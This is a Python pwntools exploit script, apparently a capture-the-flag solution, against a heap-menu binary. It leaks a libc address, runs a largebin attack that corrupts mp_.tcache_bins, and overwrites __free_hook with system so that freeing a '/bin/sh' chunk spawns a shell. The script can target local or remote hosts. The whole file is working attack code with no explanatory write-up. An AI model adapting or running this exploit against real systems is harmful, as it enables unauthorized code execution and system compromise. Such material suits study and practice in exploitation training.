from pwn import *
context(os='linux', arch='i386', kernel='amd64')
context.terminal = ['tmux', 'splitw', '-h']
fname = args.FNAME if args.FNAME else './vuln'
exe = ELF(fname)
context.binary = exe

DEFAULT_LIB = {'i386':'/lib/i386-linux-gnu/libc.so.6', 'amd64':'/lib/x86_64-linux-gnu/libc.so.6'}
DEFAULT_LDSO = {'i386':'/lib/i386-linux-gnu/ld-linux.so.2', 'amd64':'/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'}
libname = args.LIB if args.LIB else DEFAULT_LIB[context.arch]
ldname = args.LDSO if args.LDSO else DEFAULT_LDSO[context.arch]
libc = ELF(libname)
ldso = ELF(ldname)

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

def pid_pause():
    if not args.REMOTE:
        log.info('PID: %d' % io.proc.pid)
    pause()

s, sl, sa, sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'>', str(idx).encode())

def add(idx, sz):
    opt(1)
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())

def edit(idx, content):
    opt(3)
    sla(b'Index: ', str(idx).encode())
    sa(b'', content)

def show(idx):
    opt(4)
    sla(b'Index: ', str(idx).encode())

def delete(idx):
    opt(2)
    sla(b'Index: ', str(idx).encode())

def exp():
    add(0, 0x500)
    add(1, 0x510)
    add(2, 0x510)
    add(3, 0x510)
    add(4, 0x510)
    delete(2)
    add(5, 0x800) # put chunk1(0x520) into largebin

    show(2)
    fd = u64(rl()[:-1].ljust(8, b'\0'))
    arena_off = 0x1e3ba0
    libc.address = fd - 1168 - arena_off
    log.success(f'========= libc@ {hex(libc.address)}')
    
    mp_off = 0x7f27eef77280 - 0x7f27eed94000
    mp_addr = libc.address + mp_off
    log.success(f'========= mp_@ {hex(mp_addr)}')
    
    mp_tcache_bins_off = 0x50
    fake_bk_nxtsz = mp_addr + mp_tcache_bins_off - 0x20
    edit(2, flat([fd, fd, fake_bk_nxtsz, fake_bk_nxtsz]))
    delete(0)
    add(6, 0x800)

    delete(4)
    
    edit(0, flat({0:'/bin/sh\0', 0x70:[libc.sym.__free_hook]}))
    add(7, 0x510)
    edit(7, p64(libc.sym.system))
    
    delete(0)
    

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()